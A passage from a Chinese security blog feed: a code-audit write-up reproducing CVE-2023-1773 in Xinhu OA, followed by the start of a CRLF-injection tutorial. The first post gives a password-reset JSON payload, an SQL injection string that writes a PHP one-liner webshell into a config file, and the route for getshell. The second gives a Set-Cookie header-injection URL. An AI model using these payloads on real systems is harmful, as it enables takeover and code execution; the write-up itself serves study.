alt="image-20240711111821357"></p><ul><li><input disabled="" type="checkbox"> 该怎么按照溯源方式找到这个文件？</li></ul><p><code>rocktokenarr</code>是个数组，这个信息并没有什么用，再回到<code>jmChajian.php</code>。</p><p>gettoken()函数的作用是根据传入的参数 <code>$na</code> 来获取对应的 token 值。如果在 <code>$this-&gt;rocktokenarr</code> 数组中找到了对应的键 <code>$na</code>，则返回该值；否则，调用 <code>$this-&gt;rock-&gt;get($na, $dev)</code> 方法来获取值，并将其作为结果返回。</p><p>那么总结一下，$ajaxbool从GET参数里获得。</p><p>可以见得，上面的步骤对漏洞解决好像没有作用，但是写在这里是为了学习溯源过程，毕竟：<strong>磨刀不误砍柴工</strong>。</p><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><h5 id="参数处理"><a href="#参数处理" class="headerlink" title="参数处理"></a>参数处理</h5><p><code>View.php</code>首先对各个GET参数进行拆分，存入并拼接路径。</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711150108140.png" alt="image-20240711150108140"></p><p>对GET参数m进行拆分。</p><h5 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h5><p><img src="/./../images/posts/CVE-2023-1773/image-20240711150357453.png" alt="image-20240711150357453"></p><p>出现了一个常量<code>ROOT_PATH</code>和<code>$p</code>，溯源去弄明白它们的值。</p><p>溯源<code>dirname()</code>方法，发现是个不可嵌入式存根——底层方法，那我们直接上网搜索即可。</p><blockquote><p><code>dirname()</code> 是一个 PHP 内置函数，用于返回一个路径中的目录部分。它会返回一个字符串，该字符串包含了指定路径中的目录部分，而不包括文件名部分。</p><p><code>dirname(__FILE__)</code> 返回当前文件的目录名，而 <code>dirname(dirname(__FILE__))</code> 则返回当前文件的上一级目录的目录名。</p><p>因此，这行代码的作用是定义一个常量 <code>ROOT_PATH</code>，其值是当前文件的上一级目录的路径，且路径中的反斜杠被替换为斜杠。这样可以方便地在项目中引用该常量，以获取项目根目录的路径。</p></blockquote><p>当前文件路径：<code>···/src/include/View.php</code>，可知<code>ROOT_PATH</code>是<code>/src</code></p><p><code>$p</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span>        = PROJECT;</span><br></pre></td></tr></table></figure><p>溯源<code>PROJECT</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;PROJECT&#x27;</span>))<span class="title function_ invoke__">define</span>(<span class="string">&#x27;PROJECT&#x27;</span>, <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;webmain&#x27;</span>));</span><br></pre></td></tr></table></figure><p>一般来说<code>$p=webmain</code>，当然也可以GET参数控制，这里我们只用到<code>webmain</code>。</p><p>最后溯源一下<code>strformat()</code>方法（其实可以直接猜出该方法的作用）：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711145022332.png" alt="image-20240711145022332"></p><p>溯源<code>stringformat()</code>方法：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711145254752.png" alt="image-20240711145254752"></p><p>总结一下strformat()的作用：对一个字符串进行格式化处理，通过替换占位符来动态生成最终的字符串输出。</p><p><strong>明明一眼可以猜出的作用，通过多次溯源才得到，这就是审计面向对象的一个痛楚。</strong></p><p>再看看下面的文件包含：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711145858245.png"></p><p>三个路径：</p><p><code>$actpath=/src/p/d/_m</code></p><p><code>$catfile=/src/p/d/_m/mAction.php</code></p><p><code>$catfile1=/src/p/d/_m/_mAction.php</code></p><p>先包含<code>$catfile1</code>，<code>$catfile</code>后还有代码，直接喂给GPT：</p><p>首先是 method_exists()方法：</p><blockquote><p>在PHP中，<code>method_exists()</code> 函数用于检查一个对象或类是否具有指定的方法。其语法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">method_exists</span> ( <span class="keyword">mixed</span> <span class="variable">$object</span> , <span class="keyword">string</span> <span class="variable">$method_name</span> )</span><br></pre></td></tr></table></figure><ul><li><code>$object</code>：表示要检查的对象或类名。</li><li><code>$method_name</code>：表示要检查的方法名。</li></ul><p><code>method_exists()</code> 函数返回一个布尔值，如果对象或类中存在指定的方法，则返回 <code>true</code>，否则返回 <code>false</code>。</p></blockquote><p><img src="/./../images/posts/CVE-2023-1773/image-20240711153547847.png" alt="image-20240711153547847"></p><p>通过对<code>$ajaxbool</code>，也就是<code>GET[‘ajax’]</code>的调控，可以实例化不同的对象。</p><p>如果<code>$xhrock</code>存在<code>$actname</code>方法，执行该方法并把结果<code>echo</code>出来。至于<code>beforeAction()</code>方法和<code>afterAction()</code>方法不过多注意。</p><h6 id="深入思考"><a href="#深入思考" class="headerlink" title="深入思考"></a>深入思考</h6><p>假设：a&#x3D;index，m&#x3D;reimpalt|api，d&#x3D;task&amp;p&#x3D;webmain，ajax&#x3D;false，会发生什么？</p><p><code>$catfile=/src/webmain/task/api/reimplatAction.php</code></p><p><code>$clsname=reimplatClassAction</code></p><p><code>$xhrock=new reimplatClassAction()</code></p><p><code>$action=indexAction</code></p><p><code>$actbstr=$xhrock-&gt;$actname()</code></p><p>会实例化reimplatClassAction对象，并执行indexAction()方法（<strong>只要实例化对象就可以触发对应方法</strong>）。请记住这段分析，下文会用到。</p><p>剩下的代码跟渲染有关，不赘叙。</p><h5 id="参数利用"><a href="#参数利用" class="headerlink" title="参数利用"></a>参数利用</h5><p>p，d，_m都被用来拼接路径，m被拼接成mAction.php文件。对于参数a，如果$ajax&#x3D;true，拼接为aAjax，否则被拼接成aAction。</p><p>很明显，a的作用是确定方法。这里引用一下大佬的解释：</p><blockquote><p>m可以用｜分隔，分隔的时候取m[0]为action php。分别判断m[0]Action.php,m[1]Action.php是否存在，存在都会进行文件包含<code>m:模版文件内容 拼接路径为wen主目录路径+d+mAction.php</code>d:webmain下面的action的前置路径，这里如果当m存在|的时候，会将｜的后面部分拼接到d后面<code>a:Class action里面对应的方法调用</code>ajaxbool 如果为true，则会调用$aAjax的方法，如果为false，直接调用$aAction方法。如果$ajaxbool &#x3D;&#x3D; ‘html’ || $ajaxbool &#x3D;&#x3D; ‘false’ 则会进行模版渲染。所以调用的方法是ACtion或者Ajax结尾</p></blockquote><h5 id="思考可控"><a href="#思考可控" class="headerlink" title="思考可控"></a>思考可控</h5><p>包含了两个文件，<code>$catfile1</code>的可控性不是很强，但是$catfile可以被很好地控制。</p><p>这里引用一下师傅博客的解释：</p><blockquote><p>其实actfile1我们并不能做到真正完全的可控，因为其最后的拼接是<code>$_m.$_m</code>，就意味着最后包含的php文件的前缀名必须与上级目录相同，具有一定的局限性，这里我们侧重观察actfile被包含后的操作(实际上actfile1被包含后也确实并没有进行更多的操作了)，接下来的分析围绕着actfile，$classname变量由$a和”ClassAction”拼接起来，$a可控。，$actname变量由$a和”Action”拼接起来，$a可控。如果ajaxbool为true那么$actname由$a和”Ajax”拼接，$ajaxbool可控(前文提到控制GET传参)。然后new一个名为$classname的值的类，判断该对象中是否存在名为$actname的方法，如果存在，就执行并把结果echo出来</p></blockquote><h5 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h5><p>经过以上的分析，我们知道了如何激发一个文件：通过参数拼接然后包含对应文件。另外，只要包含了特定文件，也可以触发对应的方法。也就是说：如果想利用某个方法，只需要构造对应的GET参数。</p><p>再深入一点：<code>index.php</code>会包含<code>View.php</code>，我们只需要在<code>index.php</code>操作即可。</p><h2 id="0x03-寻找漏洞"><a href="#0x03-寻找漏洞" class="headerlink" title="0x03 寻找漏洞"></a>0x03 寻找漏洞</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>我们知道了参数的利用过程，但这不代表找到了漏洞，这就像找到了入口，却没有找到宝藏。</p><p>由于实力有限，这里直接给出一个漏洞点，之后我会下载有关寻找漏洞和代码审计的工具。</p><h3 id="文件写入与包含"><a href="#文件写入与包含" class="headerlink" title="文件写入与包含"></a>文件写入与包含</h3><h4 id="方法与要求"><a href="#方法与要求" class="headerlink" title="方法与要求"></a>方法与要求</h4><p>如果可以在某个文件中写入木马并包含该文件，上蚁剑，即可实现<code>getshell</code>。</p><p>为了实现该目的，我们需要哪些条件呢？</p><ul><li>可以执行写入的文件A与被写入的文件B</li><li>怎么写入A文件</li><li>写入后该如何包含B文件</li></ul><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>&#x2F;webmain&#x2F;system&#x2F;cog&#x2F;cogAction.php下的cogClassAction::savecongAjax()方法可以执行文件写入，写入到&#x2F;src&#x2F;webmain&#x2F;webmainConfig.php，具体代码如下：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711165604318.png" alt="image-20240711165604318"></p><p>代码不难理解，重点是<strong>可控点在哪里</strong>，在<code>$this-&gt;adminname</code>。</p><p>为什么在这里，我们不妨尝试溯源一下<code>$this-&gt;adminname</code>。</p><h5 id="溯源-this-adminname"><a href="#溯源-this-adminname" class="headerlink" title="溯源$this-&gt;adminname"></a>溯源<code>$this-&gt;adminname</code></h5><p>点击<code>adminname</code>：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711165851332.png" alt="image-20240711165851332"></p><p>往下找，肯定有赋值语句：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711165924921.png" alt="image-20240711165924921"></p><p>点击右边绿色的<code>adminname</code>，发现点击不了。思考是不是<code>getsession()</code>方法控制左边<code>adminname</code>的值：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711170058765.png" alt="image-20240711170058765"></p><p>这就是不断封装，点击<code>session()</code>方法，点击不了。点击<code>rock</code>看看情况：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711170235918.png" alt="image-20240711170235918"></p><p>点击绿色的<code>rock</code>，到了config.php，并没有<code>session()</code>的痕迹：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711170400038.png" alt="image-20240711170400038"></p><p>再往上层（底层）找，在rockClass.php里有：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711171251569.png" alt="image-20240711171251569"></p><p><code>setsession()</code>在<code>session()</code>上面，一不留神就会忽略掉。这里其实有一层逻辑关系（先setssion再使用session），不过相当隐晦，我也是事后才知道。</p><p>那么我们应该溯源<code>setsession()</code>：</p><p>······</p><p>最后确定<code>$this-&gt;adminname</code>是从数据库里面提取的。那么我们只需要改变数据库里对应的值即可，也就是SQL注入改变对应的值。</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p><em><strong>bp里的$ajax参数有误，是$ajaxbool，因为默认是false所以部分情况没影响，这里不做修改，请读者注意！</strong></em></p><p>在<code>/src/webmain/task/api/reimplatAction.php</code>文件下有SQL注入点</p><h4 id="修改密码（非SQL注入，但别跳）"><a href="#修改密码（非SQL注入，但别跳）" class="headerlink" title="修改密码（非SQL注入，但别跳）"></a>修改密码（非SQL注入，但别跳）</h4><p>修改密码比较简单，代码如下：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711193634666.png" alt="image-20240711193634666"></p><p>溯源得知<code>arrvalue()</code>方法可以获取数组对应的值。</p><p>思路也比较简单：激活对应方法即可，下面有几个问题需要解决：</p><ul><li>参数在哪里输入</li><li>怎么使参数符合要求</li><li>怎么激活对应方法</li></ul><h5 id="寻找参数输入点"><a href="#寻找参数输入点" class="headerlink" title="寻找参数输入点"></a>寻找参数输入点</h5><p><img src="/./../images/posts/CVE-2023-1773/image-20240711194528749.png" alt="image-20240711194528749"></p><p>对<code>$data</code>溯源：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711194554428.png" alt="image-20240711194554428"></p><p>对<code>$bodystr</code>溯源：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711194641234.png" alt="image-20240711194641234"></p><p>对<code>$body</code>溯源：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711194707054.png" alt="image-20240711194707054"></p><p>对<code>getpostdata()</code>溯源：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711194801271.png" alt="image-20240711194801271"></p><p>喂给GPT：</p><blockquote><p>这段代码的目的是从POST请求中获取数据。如果<code>$GLOBALS[&#39;HTTP_RAW_POST_DATA&#39;]</code>存在，它将首先尝试从那里获取数据。如果这个变量为空或不存在，它将尝试从<code>php://input</code>中获取POST请求的数据，并返回处理后的数据。</p></blockquote><p>溯源<code>&#39;HTTP_RAW_POST_DATA&#39;</code>发现是存根，再喂给GPT：</p><blockquote><p><code>$HTTP_RAW_POST_DATA</code> 是一个在 PHP 5.2.0 版本中被废弃的全局变量，用于存储原始的 POST 请求数据。这个变量包含了通过 POST 方法发送到服务器的原始数据，而不是经过 PHP 解析后的数据。</p><p>在 PHP 5.6.0 版本中，这个变量被移除，因为它会导致一些安全问题。取而代之的是使用 <code>php://input</code> 来获取原始的 POST 数据。<code>php://input</code> 是一个只读流，可以用于读取 POST 请求的原始数据</p></blockquote><p>一言以蔽之：获取请求体数据。</p><h5 id="使参数符合要求"><a href="#使参数符合要求" class="headerlink" title="使参数符合要求"></a>使参数符合要求</h5><p><img src="/./../images/posts/CVE-2023-1773/image-20240711195526697.png" alt="image-20240711195526697"></p><p>代码会经过一次解密，所以我们要先加密一次，把加密后的数据再发送即可正确解析。</p><p>此外，解密后的数据会被<code>json_decode()</code>方法执行一次，溯源<code>json_decode()</code>方法，结果是存根，喂给GPT：</p><blockquote><p><code>json_decode()</code> 是一个在 PHP 中用于解析 JSON 字符串的非常有用的函数，可以方便地将 JSON 数据转换为 PHP 中的数据结构。</p></blockquote><p>很明显，我们的请求体参数是<code>json</code>格式的，根据程序要求构造一个json数据包：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;msgtype&quot;</span><span class="punctuation">:</span> <span class="string">&quot;editpass&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;pass&quot;</span><span class="punctuation">:</span> <span class="string">&quot;666&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>注意：json只允许双引号包裹数据，用单引号是错的，这一点我被卡了好久。</strong></p><p>回顾上文，我们需要把该数据包加密。有<code>strunlook()</code>方法，那么应该有<code>strlook()</code>方法（这个读者可以自己寻找，不做溯源）：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711200628706.png" alt="image-20240711200628706"></p><p>再看看strunlook()代码：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711200710913.png" alt="image-20240711200710913"></p><p>二者比较对称，不做赘叙。</p><p>现在需要修改程序：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711201718616.png" alt="image-20240711201718616"></p><p>增加：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$exp</span> = <span class="variable">$body</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">strlook</span>(<span class="variable">$exp</span>, <span class="variable">$key</span>);</span><br></pre></td></tr></table></figure><h5 id="激活对应的方法"><a href="#激活对应的方法" class="headerlink" title="激活对应的方法"></a>激活对应的方法</h5><p>路径和方法：<code>/src/webmain/task/api/reimplatAction.php</code>的<code>reimplatClassAction::indexAction()</code>方法</p><p>转换为GET参数：</p><p><code>index.php/?a=index&amp;m=reimpalt|api&amp;d=task&amp;p=webmain&amp;ajax=false</code></p><p>bp请求包如下：（必须是POST请求）</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711205505138.png" alt="image-20240711205505138"></p><h5 id="开始操作"><a href="#开始操作" class="headerlink" title="开始操作"></a>开始操作</h5><p>发送json数据包加密：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;msgtype&quot;</span><span class="punctuation">:</span> <span class="string">&quot;editpass&quot;</span><span class="punctuation">,</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;pass&quot;</span><span class="punctuation">:</span> <span class="string">&quot;666”&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/./../images/posts/CVE-2023-1773/image-20240711210324796.png" alt="image-20240711210324796"></p><p>发送加密字符串以修改密码：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711210415934.png" alt="image-20240711210415934"></p><p>重新登入发现密码已改。</p><h4 id="修改adminname"><a href="#修改adminname" class="headerlink" title="修改adminname"></a>修改<code>adminname</code></h4><p>我选择<code>$msgtype==&#39;editmobile&#39;</code>：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711210644660.png" alt="image-20240711210644660"></p><h5 id="m-方法"><a href="#m-方法" class="headerlink" title="m()方法"></a>m()方法</h5><p><img src="/./../images/posts/CVE-2023-1773/image-20240711211041938.png" alt="image-20240711211041938"></p><p>包含相关文件，主要作用是锁定表。参数是<code>admin</code>，锁定<code>xinhu_admin</code>表</p><h5 id="update-方法"><a href="#update-方法" class="headerlink" title="update()方法"></a><code>update()</code>方法</h5><p>溯源得知数据库是<code>mysqli</code>，寻找<code>update()</code>方法的底层语句：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711212337944.png" alt="image-20240711212337944"></p><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><p><img src="/./../images/posts/CVE-2023-1773/image-20240711165604318.png" alt="image-20240711165604318"></p><p>目标语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> xinhu_admin <span class="keyword">set</span> `mobile`<span class="operator">=</span>‘<span class="number">123</span>’, name<span class="operator">=</span>‘\n$_POST[<span class="number">1</span>];<span class="operator">/</span><span class="operator">/</span>’ <span class="keyword">where</span> `<span class="keyword">user</span>`<span class="operator">=</span>admin;</span><br></pre></td></tr></table></figure><p>payload_0：<code>123’, name=‘\n$_POST[1];//</code></p><p>payload_1：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;msgtype&quot;</span><span class="punctuation">:</span> <span class="string">&quot;editmobile&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mobile&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123’, name=‘\n$_POST[1];//&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>bp如图：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711215529745.png" alt="image-20240711215529745"></p><p>修改成功</p><h3 id="更新adminname"><a href="#更新adminname" class="headerlink" title="更新adminname"></a>更新<code>adminname</code></h3><p>本质上是要触发<code>cogAction.php</code>文件中<code>savecongAjax()</code>方法：</p><p><img src="/./../images/posts/CVE-2023-1773/image-20240711213830817.png" alt="image-20240711213830817"></p><p>之后退出重登，蚁剑连上去即可。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>本次漏洞复现和代码审计收获颇丰。下一篇文章会对上面的能力要求做一个总结。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CRLF入门</title>
      <link href="/2024/06/30/CRLF%E5%85%A5%E9%97%A8/"/>
      <url>/2024/06/30/CRLF%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="CRLF漏洞入门"><a href="#CRLF漏洞入门" class="headerlink" title="CRLF漏洞入门"></a>CRLF漏洞入门</h1><p>参考文章：<a href="https://xz.aliyun.com/t/9707?time__1311=n4+xuDgD9AD=YErDlxGObDyiiOuqiKPDCQKPD&alichlgref=https://www.bing.com/#toc-1">浅入深出谭谈 HTTP 响应拆分（CRLF Injection）攻击（上） - 先知社区 (aliyun.com)</a></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这段时间有空刷刷BurpSuite的CSRF，有道题需要HTTP头部注入，趁此机会学学。</p><p>另外，对漏洞的利用往往不是单独的，而是多个漏洞相互配合。比如本篇的CRLF可以和SSRF、CSRF配合。</p><h2 id="0x01-CRLF-与-CRLF-Injection"><a href="#0x01-CRLF-与-CRLF-Injection" class="headerlink" title="0x01 CRLF 与 CRLF Injection"></a>0x01 CRLF 与 CRLF Injection</h2><h3 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h3><blockquote><p>CRLF 指的是<strong>回车符</strong>（CR，ASCII 13，\r，%0d）和<strong>换行符</strong>（LF，ASCII 10，\n，%0a）的简称（\r\n）。HTTP报文以状态行开始，跟在后面的是HTTP首部（HTTP Header），首部由多个首部字段构成，每行一个首部字段，HTTP首部后是一个空行，然后是报文主体（HTTP Body）。状态行和首部中的每行以CRLF结束，首部与主体之间由一空行分隔。<strong>或者理解为首部中每个首部字段以一个CRLF分隔，首部和主体由两个CRLF分隔。</strong></p></blockquote><h3 id="CRLF-Injection"><a href="#CRLF-Injection" class="headerlink" title="CRLF Injection"></a>CRLF Injection</h3><p>HTTP报文的结构以CRLF划分，通过添加CRLF可以制造CRLF Injection，原理如下：</p><p>如果Web应用没有对输入做出严格过滤，那么攻击者便可以通过<code>CRLF(%0a%0d)</code>配合特定字符串，恶意地改变HTTP报文的结构，实现添加Cookie甚至注入HTML代码等操作。所以CRLF注入漏洞又称为<strong>HTTP响应拆分漏洞（HTTP Response Splitting）</strong>，简称<strong>HRS</strong>。</p><p>以下引用阐述更清晰的原文：</p><blockquote><p>在HTTP协议中，HTTP Header 部分与 HTTP Body 部分是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制 HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些恶意的HTTP Header，如会话Cookie，甚至可以注入一些HTML代码。这就是CRLF注入漏洞的核心原理。</p></blockquote><p>更深层地想，这个漏洞其实也是操控数据流入侵控制流。</p><h2 id="0x02-CRLF-injection应用"><a href="#0x02-CRLF-injection应用" class="headerlink" title="0x02 CRLF injection应用"></a>0x02 CRLF injection应用</h2><h3 id="Location-字段的-302-跳转"><a href="#Location-字段的-302-跳转" class="headerlink" title="Location 字段的 302 跳转"></a>Location 字段的 302 跳转</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span> . <span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码的意思是：当条件满足时，将请求包中的url参数值拼接到<code>Location</code>字符串中，并设置成响应头发送给客户端。</p><p>思考得更深入一点：正常的url参数值仅仅是纯粹的数据流，不能影响到控制流。但是注入型漏洞往往可以通过自身语法或标准越过这一层限制。</p><p>综合上面两段话：url参数会被拼接到响应包的响应头<code>Locaion</code>后面，我们可以通过<code>%0d%0a</code>，使程序判断响应头<code>Location</code>到这里结束，此时后面的payload可以视作下一行的请求头及内容。</p><h4 id="正常情况"><a href="#正常情况" class="headerlink" title="正常情况"></a>正常情况</h4><p>exp：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=https://xxx.top</span><br></pre></td></tr></table></figure><p>得到的正常的302跳转包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> </span><br><span class="line">Moved Temporarily Date: Fri, 27 Jun 2014 17:52:17 GMT </span><br><span class="line">Content- Type: text/html</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>154 </span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>https://xxx.top</span><br></pre></td></tr></table></figure><p>现在尝试拼接</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="attribute">url</span>=https://xxx.top%0d%0aSet-Cookie: <span class="attribute">PHPSESSID</span>=whoami</span><br></pre></td></tr></table></figure><blockquote><p>%0d和%0a分别是CR和LF的URL编码。前面我们讲到，HTTP规范中，行以CRLF结束。所以当检测到%0d%0a后，就认为Location首部字段这行结束了，Set-Cookie就会被认为是下一行</p></blockquote><p>此时得到的302跳转包：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">HTTP</span>/<span class="number">1</span>.<span class="number">1</span> <span class="number">302</span> </span><br><span class="line"><span class="attribute">Moved</span> Temporarily Date: Fri, <span class="number">27</span> Jun <span class="number">2014</span> <span class="number">17</span>:<span class="number">52</span>:<span class="number">17</span> GMT </span><br><span class="line"><span class="attribute">Content</span>- Type: text/html</span><br><span class="line"><span class="attribute">Content</span>-Length: <span class="number">154</span> </span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Location</span>: https://xxx.top</span><br><span class="line"><span class="attribute">Set</span>-Cookie: PHPSESSID=whoami</span><br></pre></td></tr></table></figure><p>等跳转后用户就多了个Cookie：<code>PHPSESSID=whoami</code></p><p>总结一下：通过改情况下的CRLF漏洞利用，我们可以给用户添加一个Cookie。但是目前通过 Location 字段的 302 跳转进行 CRLF 注入这个漏洞已经被修复了</p><h3 id="PHP-fsockopen-函数"><a href="#PHP-fsockopen-函数" class="headerlink" title="PHP fsockopen() 函数"></a>PHP fsockopen() 函数</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p> fsockopen() 函数：</p><blockquote><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code> 用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。<br>fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。</p></blockquote><h4 id="漏洞复现–云服务器"><a href="#漏洞复现–云服务器" class="headerlink" title="漏洞复现–云服务器"></a>漏洞复现–云服务器</h4><p>本次在服务器上运行如下服务：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    